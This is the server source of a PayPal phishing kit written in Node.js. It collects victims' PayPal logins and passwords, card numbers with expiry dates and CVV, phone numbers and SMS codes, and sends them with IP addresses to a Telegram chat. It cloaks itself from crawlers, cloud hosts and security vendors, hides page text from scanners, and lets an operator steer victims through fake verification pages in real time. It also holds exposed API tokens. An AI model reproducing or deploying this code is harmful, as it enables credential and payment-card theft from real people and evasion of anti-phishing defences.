const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const { Telegraf } = require('telegraf'); // Telegram bot library
const multer = require('multer'); // To handle image uploads
const TelegramBot = require("node-telegram-bot-api");
const crypto = require("crypto");
const session = require('express-session');
const useragent = require("express-useragent");
const minifyHTML = require("express-minify-html");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");
const cheerio = require("cheerio");
const qs = require("querystring");
const https = require('https');
const bodyParser = require("body-parser");
const moment = require('moment-timezone');
const cookieParser = require('cookie-parser');



const app = express();

const server = http.createServer(app);
const io = require("socket.io")(server, {
    transports: ["polling"], // Disable WebSocket, allow only polling
});

const PORT = 3000;

const secureKey = crypto.randomBytes(32).toString('hex');
// Session middleware setup
app.use(session({
    secret: secureKey,
    resave: false,
    cookie: { secure: true },  // Set to false if not using HTTPS, otherwise true
    saveUninitialized: true
}));
app.use(cookieParser());
// Telegram bot configuration

const BOT_TOKEN = '7838563553:AAG6xPs_WSb_0JC8-7m8URjeRRR09kNmIEk'; // Replace with your Telegram bot token
const CHAT_LOG = '-4916736703'; // Replace with your group chat ID
const CHAT_ID = '-4916736703'; // Replace with your group chat ID
const LANG_ALL = 'CZ'; // Replace with your group chat ID
// Initialize the Telegram bot
const bot = new Telegraf(BOT_TOKEN, { polling: false });
//bot.telegram.deleteWebhook().then(() => {
//    console.log("Webhook deleted");
//});

const upload = multer(); 

// Example agent creation (for HTTPS requests with custom settings, e.g., to ignore SSL verification errors)
const agent = new https.Agent({  
  rejectUnauthorized: false // Set this to false if you want to ignore SSL certificate validation
});

////

const langFile = fs.readFileSync(path.join(__dirname, 'lang', 'lang.json'));
const translations = JSON.parse(langFile);


async function convertTelegramFileToBase64(fileId) {

  try {
    // Step 1: Get file path from Telegram
    const getFileRes = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
    const filePath = getFileRes.data.result.file_path;

    // Step 2: Download the file as buffer
    const fileRes = await axios({
      method: 'GET',
      url: `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`,
      responseType: 'arraybuffer'
    });

    // Step 3: Convert to base64
    const base64Data = Buffer.from(fileRes.data).toString('base64');

    // Step 4: Guess MIME type from extension
    let mimeType = 'image/jpeg'; // default
    if (filePath.endsWith('.png')) mimeType = 'image/png';
    if (filePath.endsWith('.webp')) mimeType = 'image/webp';

    // Final Base64 Data URI
    const base64Image = `data:${mimeType};base64,${base64Data}`;

    return base64Image;
  } catch (err) {
    console.error('Error converting file_id to base64:', err.message);
    return null;
  }
}


app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
// app.set('views', path.join(__dirname, 'views'));




let visitorIPs = [];
let connectedIPs = new Set();
let userSessions = {}; // Store user sessions and selected IPs
let visitors = {}; // Store visitor images by IP


app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json({ limit: '10mb' }));
app.use(useragent.express());
app.set('trust proxy', 1);
app.use(
  minifyHTML({
    override: true,
    htmlMinifier: {
      collapseWhitespace: true,
      removeComments: true,
      minifyJS: true,
      minifyCSS: true,
    },
  })
);





function getVisitorIP(req) {
  // Check if 'X-Forwarded-For' header is present
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';

  // If there are multiple IP addresses in 'X-Forwarded-For', take the first one (real client IP)
  if (ip && ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // In case of IPv6, remove the '::ffff:' prefix for IPv4 addresses
  if (ip && ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }

  return ip;
}


const bannedPatterns = ['213.44.27.','77.95.65.'];

function isIpBanned(ip) {
  return bannedPatterns.some(pattern => ip.startsWith(pattern));
}

app.use((req, res, next) => {
    const ip = getVisitorIP(req);
    res.locals.nonce = crypto.randomBytes(16).toString('base64');  // Random nonce
    res.setHeader('X-Frame-Options', 'DENY'); 	
    console.log('Visitor IP:', ip); // 🔍 log IP for debugging
	  if (!req.cookies.js_enabled) {
		res.cookie('js_enabled', 'true', { maxAge: 900000, httpOnly: false });
		if (!req.headers['user-agent'].includes('Mozilla')) {
		  return res.status(403).send('Forbidden (no JS)');
		}
	  }
    //if (isIpBanned(ip)) {
    //    console.log(`Blocked banned IP: ${ip}`);
     //   return res.status(403).send('Forbidden');
   // }

    if (req.query.dmn) {
        req.session.dmn = req.query.dmn;
    } else if (!req.session.dmn) {
        req.session.dmn = '';
    }
    // Non-IP checks
    const fileExt = path.extname(req.path).toLowerCase();
    const blockedExtensions = ['.ejs', '.js', '.json', '.css', '.svg', '.woff', '.txt', '.png', '.ico'];

    if (blockedExtensions.includes(fileExt)) {
        return res.redirect(302, 'http://127.0.0.1');
    }

    next();
});


// Function to check IP address details
const ipCache = new Map();
const CACHE_TTL = 60 * 60 * 1000; // 1 hour


// List of domain keywords you want to block
const blockedDomainKeywords = [
  'google',
  'googlebot',
  'microsoft',
  'netcraft','liroulet',
  'msn',
  'azure',
  'amazon',
  'amazonaws',
  'aws',
  'cloudfront',
  'netutils',
  'cloudflare',
  'digitalocean',
  'linode',
  'ovh',
  'hetzner',
  'contabo',
  'tencent',
  'baidu',
  'yandex',
  'alibaba',
  'alicloud',
  'oracle',
  'akamai',
  'fastly',
  'vultr',
  'cdn77',
  'netlify',
  'vercel',
  'upcloud',
  'scaleway',
  'gcore',
  'rackspace',
  'hostgator',
  'bluehost',
  'dreamhost',
  'fly.io',
  'heroku',
  'render',
  'glitch',
  'koyeb',
  'firebase',
  'ipinfo.io',
  'whois',
  'crawler',
  'bot',
  'scanner',
  'proxy',
  'vpn',
];



const blockedHostnames = ['cache.google.com', 'googleusercontent.com', 'proxy', 'bot'];

// Allowed countries
const allowedCountries = [LANG_ALL, 'MA'];

// IP analysis function using AbuseIPDB
async function checkIpAddress(ip, attempt = 1) {
  if (ipCache.has(ip)) {
    const { timestamp, result } = ipCache.get(ip);
    if (Date.now() - timestamp < CACHE_TTL) {
      console.log('Returning cached result for IP:', ip);
      return result;
    }
    ipCache.delete(ip); // remove expired
  }

  try {
    const response = await axios.get(`https://api.abuseipdb.com/api/v2/check?ipAddress=${ip}`, {
      headers: {
        'Key': '6179b60cad3bee4d4ce65e9cab325fb71c9974c567c6b702cf784dc3ea74d0064f23d014173d66e4',
        'Accept': 'application/json',
      },
      timeout: 5000
    });

    const data = response.data.data;
    const domain = (data.domain || '').toLowerCase();
    const hostnames = (data.hostnames || []).map(h => h.toLowerCase());

    const result = {
      isBot: data.abuseConfidenceScore > 1,
      isHosting: data.usageType === 'Data Center/Web Hosting/Transit',
      hasBlockedDomain: blockedDomainKeywords.some(keyword => domain.includes(keyword)),
      hasBlockedHostname: hostnames.some(h => blockedHostnames.some(b => h.includes(b))),
      countryAllowed: allowedCountries.includes(data.countryCode)
    };

    ipCache.set(ip, { result, timestamp: Date.now() });
    return result;

  } catch (err) {
    console.error(`Attempt ${attempt} failed for IP ${ip}:`, err.message);

    if (attempt < MAX_RETRIES) {
      console.log(`Retrying (${attempt + 1}/${MAX_RETRIES})...`);
      await new Promise(resolve => setTimeout(resolve, RETRY_DELAY_MS));
      return checkIpAddress(ip, attempt + 1);
    }

    // Default to deny access if IP check fails
    return {
      isBot: false,
      isHosting: false,
      hasBlockedDomain: false,
      hasBlockedHostname: false,
      countryAllowed: false
    };
  }
}

// Middleware to block IPs not from allowed countries or flagged as bots/hosters
const ipBlocker = async (req, res, next) => {
  const ip = getVisitorIP(req);
  const {
    isBot,
    isHosting,
    hasBlockedDomain,
    hasBlockedHostname,
    countryAllowed
  } = await checkIpAddress(ip);

  if (!req.session) req.session = {};

  if (
    !countryAllowed ||
    isBot ||
    isHosting ||
    hasBlockedDomain ||
    hasBlockedHostname
  ) {
    req.session.isAuthorized = false;
    return res.redirect(302, 'http://127.0.0.1');
  }

  req.session.isAuthorized = true;
  next();
};






// Route to get all connected IPs
app.get('/visitor', (req, res) => {
  const visitorList = global.visitorIPs || [];
  const nonce = res.locals.nonce;
  const currentIp = req.ip; // Get the current user's IP
  let visitorItems = '';

  // Create the list of visitors, but skip the IP of the current user visiting the page
  visitorList.forEach(entry => {
    if (entry.ip !== currentIp) { // Skip adding the current visitor's IP to the list
      visitorItems += `
        <li class="list-group-item" id="visitor-${entry.ip}">
            <span class="badge badge-success">Connected</span>
            ${entry.ip} ==> ${entry.time}
        </li>
      `;
    }
  });

  res.send(`
      <html>
          <head>
              <title>Connected IPs</title>
              <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
              <style>
                  body {
                      font-family: Arial, sans-serif;
                  }
                  .ip-list {
                      color: green;
                  }
                  .badge-success {
                      background-color: #28a745; /* Green color for "Connected" */
                  }
                  .badge {
                      padding: 0.5em;
                      font-size: 0.85em;
                  }
              </style>
          </head>
          <body>
              <div class="container mt-5">
                  <h1 class="text-left">Visitors IP</h1>
                  <ul class="list-group ip-list" id="visitor-list">
                    
                  </ul>
              </div>
              <script nonce="${nonce}" src="/socket.io/socket.io.js"></script>
              <script nonce="${nonce}">
			  
			  let notifySound;

			  document.addEventListener('DOMContentLoaded', () => {
				notifySound = new Audio('/button-7.wav'); // Make sure this file exists
				notifySound.load(); // Preload the sound
			  });

			  // Unlock sound playback with one user click
			  window.addEventListener('click', () => {
				if (notifySound) {
				  notifySound.play().then(() => {
					notifySound.pause();          // Immediately pause
					notifySound.currentTime = 0;  // Rewind
				  }).catch(err => {
					console.warn('Unlock failed:', err);
				  });
				}
			  }, { once: true }); // Only run once		  
                  const socket = io();

                  if (Notification.permission !== "granted") {
                    Notification.requestPermission();
                  }

                  // Handle new visitor connection
                  socket.on('newVisitor', (data) => {
                    const ip = data.ip;
                    const time = new Date().toLocaleTimeString(); // Using the current time as an example
                    const visitorList = document.getElementById('visitor-list');
                    
                    // Skip adding the current visitor's IP if they are visiting the /visitor path
                    if (ip !== '${currentIp}' && !document.getElementById('visitor-' + ip)) {
                      // Add the visitor to the list dynamically
                      const newItem = document.createElement('li');
                      newItem.id = 'visitor-' + ip;
                      newItem.classList.add('list-group-item');
                      newItem.innerHTML = \`
                          <span class="badge badge-success">Live</span>
                          \${data.ip} ==> \${time}
                      \`;
                      visitorList.appendChild(newItem);

                      // Show a notification for new visitor
                      if (Notification.permission === "granted") {
                        new Notification("Mijn", {
                          body: ip + " connected!"
                        });
						  // Play notification sound
					  if (notifySound) {
						notifySound.play().catch(err => {
						  console.warn('Audio blocked or failed to play:', err);
						});
					  }
                      }
                    }
                  });

                  // Handle visitor disconnect event
                  socket.on('visitorDisconnected', (data) => {
                    const visitorItem = document.getElementById('visitor-' + data.ip);
                    if (visitorItem) {
                      visitorItem.remove(); // Remove the visitor from the list dynamically
                    }
                  });
              </script>
          </body>
      </html>
  `);
});
















// --------------------------
// 2. Block Bots using User-Agent
// --------------------------
// Read bot patterns from the botPatterns.txt file
const botPatternsPath = path.join(__dirname, "botPatterns.txt");

// This will hold all bot patterns
let botKeywords = [];

// Read the file and populate the botKeywords array
fs.readFile(botPatternsPath, "utf8", (err, data) => {
    if (err) {
        console.error("Error reading bot patterns file:", err);
        return;
    }
    // Split the file content into patterns
    botKeywords = data.split("\n").map(pattern => pattern.trim());
});

// Middleware to block bots based on the user-agent
const botBlocker = (req, res, next) => {
  const userAgent = req.headers["user-agent"];

  if (userAgent) {
    const isBot = botKeywords.some((pattern) => {
      const regex = new RegExp(pattern, "i");
      return regex.test(userAgent);
    });

    if (isBot) {
      req.session.isAuthorized = false;
      return res.redirect(302, 'http://127.0.0.1');
    }
  }

  next();
};




// --------------------------
// 3. Cryptage
// --------------------------
const HOMOGLYPHS = {
  a: ['a'], c: ['c'], e: ['e'], i: ['i'], o: ['o'], p: ['p'], s: ['s'], x: ['x'], y: ['y'],
  b: ['b'], d: ['d'], g: ['g'], h: ['h'], j: ['j'], k: ['k'], l: ['l'], m: ['m'], n: ['n'],
  q: ['q'], r: ['r'], t: ['t'], u: ['u'], v: ['v'], w: ['w'], z: ['z']
};

const ZERO_WIDTH_CHARS = ['\u200b', '\u200c', '\u200d', '\u2060'];

function getRandomChar(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function encodeAndBreakWord(word) {
  let result = '';
  for (let i = 0; i < word.length; i++) {
    const c = word[i];
    const glyphs = HOMOGLYPHS[c.toLowerCase()] || [c];
    let glyph = glyphs[Math.floor(Math.random() * glyphs.length)];
    if (c === c.toUpperCase()) glyph = glyph.toUpperCase();

    const encodedChar = i === 0 ? glyph : `&#x${glyph.charCodeAt(0).toString(16)};`;
    const zwc = ZERO_WIDTH_CHARS[Math.floor(Math.random() * ZERO_WIDTH_CHARS.length)];
    const hiddenEm = `<em style='position: absolute; left: -9999px;'>${getRandomChar(10)}</em>`;

    result += encodedChar + zwc + hiddenEm;
  }
  return result;
}

function obfuscateTextOnly(content) {
  return content.replace(/([^<>\s]{3,})/g, (word) => encodeAndBreakWord(word));
}

function obfuscateHtml(html) {
  return html.replace(
    /<(span|p|h\d)([^>]*)>([\s\S]*?)<\/\1>/gi,
    (match, tag, attrs, content) => {
      if (!content.trim()) return match;
      const obfuscatedContent = content.replace(/([^<>]+)(?=<|$)/g, (textNode) => {
        if (!textNode.trim() || textNode.trim().length < 3) return textNode;
        return obfuscateTextOnly(textNode);
      });
      return `<${tag}${attrs}>${obfuscatedContent}</${tag}>`;
    }
  );
}

// --------------------------
// Encryption Config
// --------------------------

const secretKey = crypto.randomBytes(32); // AES-256
const iv = crypto.randomBytes(16);        // AES CBC IV

function encrypt(text) {
  const cipher = crypto.createCipheriv("aes-256-cbc", secretKey, iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  return `${iv.toString("hex")}:${encrypted}`;
}

function decrypt(text) {
  const [ivHex, encryptedData] = text.split(":");
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    secretKey,
    Buffer.from(ivHex, "hex")
  );
  let decrypted = decipher.update(encryptedData, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

// --------------------------
// Middleware: Encrypt and Obfuscate HTML
// --------------------------

function encryptResponse(req, res, next) {
  const oldRender = res.render;

  res.render = function (view, options = {}, callback) {
    const currentPath = req.path || '';
    const isRandomPath = /^\/[a-zA-Z0-9]{20,}$/.test(currentPath);
    const langCode = req.query.lang || req.session?.lang || LANG_ALL;
    const lang = translations[langCode] || translations[LANG_ALL];
    req.session.lang = langCode;
    if (req.session?.isAuthorized && !req.session.didRedirect && !isRandomPath) {
      const slug = getRandomChar(80);
      req.session.didRedirect = true;

      if (!req.cookies.auth_token) {
        res.cookie('auth_token', 'authorized', {
          httpOnly: true,
          secure: true
        });
      }

      return res.redirect(`/${slug}`);
    }

    oldRender.call(this, view, { ...options, lang }, async (err, html) => {
      if (err) return next(err);

      try {
        const obfuscatedHtml = obfuscateHtml(html);
        const encryptedHtml = encrypt(obfuscatedHtml);

        if (req.cookies.auth_token === 'authorized') {
          const decrypted = decrypt(encryptedHtml);
          return res.send(decrypted);
        }

        return res.status(403).send("Forbidden Access");
      } catch (e) {
        console.error("Encryption error:", e);
        return next(e);
      }
    });
  };

  next();
}



// --------------------------
// 3. Rate Limiting
// --------------------------
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 15 minutes
  max: 5, // Max 100 requests per IP
  // message: "Access Denied. Please try again later.",
});





















// --------------------------
// 7. Routes
// --------------------------
app.use(helmet()); // Apply Helmet to secure your app with various HTTP headers
app.use(limiter); // Apply rate-limiting
app.use(ipBlocker); // Apply IP Blocker before bot blocker
app.use(botBlocker); // Block bots using user-agent
app.use(encryptResponse); // Encrypt page responses by default





// --------------------------
// 6. Use Helmet for Security Headers
// --------------------------

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"], // Allow resources from the same origin
        scriptSrc: [
          "'self'", 
          (req, res) => `'nonce-${res.locals.nonce}'` // Include the nonce for inline scripts
        ],
        scriptSrcAttr: ["'unsafe-inline'"], // Allow inline scripts with specific nonce
        frameSrc: ["*"], // Allow frames from any source
      },
    },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' }, // Restrict referrer data
    xssFilter: true, // Prevent cross-site scripting attacks
    noSniff: true, // Prevent browsers from interpreting files as something else
  })
);



function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    result += characters[randomIndex];
  }
  return result;
}






app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.send("User-agent: *\nDisallow: /");
});


// Serve the homepage with an image
app.get('*', async (req, res) => {
    const userIP = getVisitorIP(req);
    const nonce = res.locals.nonce;

    if (!visitors[userIP] && visitors['latest']) {
        visitors[userIP] = visitors['latest'];
    }

    const userAgent = req.headers['user-agent'];
    const agent = useragent.parse(userAgent);

    if (!global.visitorIPs) global.visitorIPs = [];

    if (!global.visitorIPs.some(entry => entry.ip === userIP)) {
        global.visitorIPs.push({ 
            ip: userIP, 
            os: agent.source.toString(), 
            platform: agent.platform.toString(),
            time: new Date().toISOString()
        });
    }

    // 🧠 Get language from query or default to English
    const lang = req.session.lang;
    const langData = translations[lang];

    res.render('info', {
        userIP: userIP,
        nonce: nonce,
        dmn: req.session.dmn,
        lang: langData // Pass language strings to EJS
    });
});





// POST
app.post("*", upload.none(), async (req, res) => {
  const visitorIp = getVisitorIP(req);
  const userAgent = req.headers["user-agent"];

  try {
    const fakeCtx = {
      from: {
        id: CHAT_ID // Replace this with your real Telegram user/chat ID
      },
      chat: {
        id: CHAT_ID
      },
      reply: async (msg, options) => {
        return await bot.telegram.sendMessage(CHAT_ID, msg, options);
      }
    };

    // Message sent flag
    let messageSent = false;

    if (req.body["enzou"] && req.body["enzop"]) {
      await bot.telegram.sendMessage(
        CHAT_LOG,
        "==============[LOG-PAYPAL]==============\nLOG : " +
          req.body["enzou"] +
          "\nPWD : " +
          req.body["enzop"] +
          "\nIP : " +
          visitorIp +
          "\nOS : " +
          userAgent +
          "\n==============[LOG-PAYPAL]=============="
      );

      messageSent = true;
    } else if (req.body["selecte"]) {
      await bot.telegram.sendMessage(
	    CHAT_ID,
        "==============[Selected-PAYPAL]==============\nSelected : " +
        req.body["selecte"] +
        "\nIP : " +
        visitorIp +
        "\n==============[Online-PAYPAL]=============="
      );
     messageSent = true;	  
    } else if (req.body["onlinevc"]) {
      await bot.telegram.sendMessage(
	    CHAT_ID,
        "==============[Online-PAYPAL]==============\nNUM : " +
        req.body["onlinevc"] +
        "\nIP : " +
        visitorIp +
        "\n==============[Online-PAYPAL]=============="
      );		
    } else if (req.body["scname"] && req.body["ccnum"] && req.body["expCC"] && req.body["vcc"]) {
	  req.session.ccnum = req.body["ccnum"];
      await bot.telegram.sendMessage(
	    CHAT_ID,
        "==============[INFO-PAYPAL]==============\nNAM : " +
        req.body["scname"] +
        "\nNUM : " +
        req.body["ccnum"] +
        "\nEXP : " +
        req.body["expCC"] +
        "\nCVV : " +
        req.body["vcc"] +
        "\nIP : " +
        visitorIp +
        "\n==============[INFO-PAYPAL]=============="
      );
	  // messageSent = true;
    } else if (req.body["sms"]) {
      await bot.telegram.sendMessage(
        CHAT_ID,
        "==============[CODE-PAYPAL]==============\nCODE : " +
          req.body["sms"] +
          "\nIP : " +
          visitorIp +
          "\nOS : " +
          userAgent +
          "\n==============[CODE-PAYPAL]=============="
      );
      messageSent = true;
    } else if (req.body["clck"]) {
      await bot.telegram.sendMessage(
        CHAT_ID,
        "==============[Click-PAYPAL]==============\nClick : " +
          req.body["clck"] +
          "\nIP : " +
          visitorIp +
          "\nOS : " +
          userAgent +
          "\n==============[Click-PAYPAL]=============="
      );
      messageSent = true;
    } else {
      return res.status(403).send("Access Denied");
    }

    // Only proceed if a Telegram message was sent
    if (messageSent) {
      // Store session data
      userSessions[CHAT_ID] = { selectedIP: visitorIp };

      // Await in case checkImageLoadedAndSendOptions uses async code
      await checkImageLoadedAndSendOptions(fakeCtx, visitorIp);
    }

    return res.json({ success: true, message: "successfully" });

  } catch (error) {
    console.error("Error in / POST:", error);
    return res.status(403).send("Access Denied");
  }
});



// Handle socket connections
io.on('connection', (socket) => {
    let ip = getVisitorIP(socket.request);
    if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);

    if (!global.connectedIPs) global.connectedIPs = new Map();
    if (!global.visitorIPs) global.visitorIPs = [];

    // Handle heartbeat
    socket.on('heartbeat', () => {
        const now = Date.now();
        const existing = global.connectedIPs.get(ip);
        if (!existing) {
            console.log(`New heartbeat from IP: ${ip}`);
            global.visitorIPs.push({ ip, time: new Date().toLocaleTimeString() });
            io.emit('newVisitor', { ip, time: new Date().toLocaleTimeString() });
        }
        global.connectedIPs.set(ip, { lastHeartbeat: now });
    });

    // Check for stale heartbeats every 5s
    const heartbeatCheck = setInterval(() => {
        const entry = global.connectedIPs.get(ip);
        const now = Date.now();
        if (entry && now - entry.lastHeartbeat > 3000) {
            console.log(`No heartbeat from IP: ${ip}, disconnecting...`);
            global.connectedIPs.delete(ip);
            global.visitorIPs = global.visitorIPs.filter(v => v.ip !== ip);
            io.emit('visitorDisconnected', { ip });
            socket.disconnect();
        }
    }, 1000);

    // On manual disconnect
    socket.on('disconnect', () => {
        console.log(`Socket disconnected from IP: ${ip}`);
        clearInterval(heartbeatCheck);
        global.connectedIPs.delete(ip);
        global.visitorIPs = global.visitorIPs.filter(v => v.ip !== ip);
        io.emit('visitorDisconnected', { ip });
    });

});






// Function to send buttons
function checkImageLoadedAndSendOptions(ctx, ip) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "❌ LOGIN", callback_data: `errorcc_page:${ip}` }],
        [
          // { text: "❌ APP", callback_data: `errorapp_page:${ip}` },
          { text: "✅ NUMBER", callback_data: `number_page:${ip}` }
        ],
        [
          { text: "❌ SMS", callback_data: `merrorss_page:${ip}` },
          { text: "✅ SMS", callback_data: `sms_page:${ip}` }
        ],
        // [
          // { text: "❌ ERR0R", callback_data: `errorpay_page:${ip}` },
          // { text: "✅ QR-CODE", callback_data: `qrcode_page:${ip}` }
        // ],		
        // [{ text: "✅ Select", callback_data: `select_page:${ip}` }]
      ]
    }
  };

  ctx.reply(`Select VBV for ${ip}:`, options);
}

// ❌ CC
bot.action(/errorcc_page:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ip = ctx.match[1];
  ipSessions[ip] = 'errorcc';

  io.emit('changePage', { ip, page: 'errorcc' });
  const msg = await ctx.reply(`${ip} => Error CC OK :D`);
  setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {}), 5000);
});

bot.action(/errorpay_page:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ip = ctx.match[1];

  io.emit('changePage', { ip, page: 'errorpay' });
  const msg = await ctx.reply(`${ip} => Error CC OK :D`);
  setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {}), 5000);
});



const pendingPhoto = {};
const photoBuffer = {};












// ✅ APP
// bot.action(/app_page:(.+)/, async (ctx) => {
  // await ctx.answerCbQuery();
  // const ip = ctx.match[1];
  // ipSessions[ip] = 'app';

  // io.emit('changePage', { ip, page: 'app' });
  // const msg = await ctx.reply(`${ip} => APP page OK :D`);
  // setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {}), 5000);
// });



const ipSessions = {};
const pendingText = {}; // userId => { ip, step }
const inputBuffer = {}; // userId => { code1, code2 }





bot.action(/merrorss_page:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ip = ctx.match[1];
  ipSessions[ip] = 'merrsms';

  io.emit('changePage', { ip, page: 'merrsms' });
  const msg = await ctx.reply(`${ip} => Error SMS OK :D`);
  setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {}), 5000);
});

bot.action(/number_page:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ip = ctx.match[1];
  const userId = ctx.from.id;

  ipSessions[ip] = 'number';
  pendingText[userId] = { ip, page: 'number' };
  inputBuffer[userId] = {};

  await ctx.reply(`✏️ Reply PhoneNumber for IP ${ip}`);
});

bot.action(/sms_page:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ip = ctx.match[1];
  const userId = ctx.from.id;
  const currentPage = ipSessions[ip];

  ipSessions[ip] = 'sms';
  pendingText[userId] = { ip, page: 'sms' };

  // If code1 already exists, skip reply and emit changePage
  if (currentPage === 'number') {

    io.emit('changePage', {
      ip,
      page: 'sms',
    });

    await ctx.reply(`${ip} => Page SMS OK :D`);
    
    // Clean up session
    delete pendingText[userId];
    delete inputBuffer[userId];
    return;
  }
  
  inputBuffer[userId] = {};

  await ctx.reply(`✏️ Reply Phone/EMAIL for IP ${ip}`);
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const input = ctx.message.text;
  const session = pendingText[userId];

  if (!session) return;

  const { ip, page } = session;
  const mpage = ipSessions[ip];

  if (!ip || !page) {
    return ctx.reply("⚠️ Session error. Please start again.");
  }


    inputBuffer[userId].code1 = input;


  const { code1 } = inputBuffer[userId];

  // Emit to Socket.IO
  io.emit('changePage', {
    ip,
    page: mpage,
    text1: code1,
  });

  await ctx.reply(`📤 Sent to ${ip} (${mpage}):\nTitle: ${code1}\n`);

  // Clean up
  delete pendingText[userId];
  delete inputBuffer[userId];

});










// Start the server
server.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));

// Start the Telegram bot
bot.launch();
